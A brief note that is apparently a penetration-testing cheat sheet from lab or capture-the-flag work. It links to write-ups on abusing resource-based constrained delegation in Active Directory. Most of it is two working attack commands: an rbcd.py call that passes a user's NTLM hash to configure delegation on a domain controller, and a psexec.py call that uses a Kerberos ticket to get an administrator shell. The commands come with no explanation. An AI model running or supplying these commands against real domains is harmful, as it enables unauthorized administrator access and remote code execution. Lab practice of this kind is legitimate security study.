https://medium.com/r3d-buck3t/how-to-abuse-resource-based-constrained-delegation-to-gain-unauthorized-access-36ac8337dd5a
https://github.com/tothi/rbcd-attack

```sh
python rbcd.py -dc-ip 192.168.213.175 resourced.local\\L.Livingstone -hashes aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808 -t RESOURCEDC -f ComputerFake04

# Make sure support.htb & dc.support.htb have been mapped to the same IP in /etc/hosts
KRB5CCNAME=administrator.ccache python3 ~/Documents/support/psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```
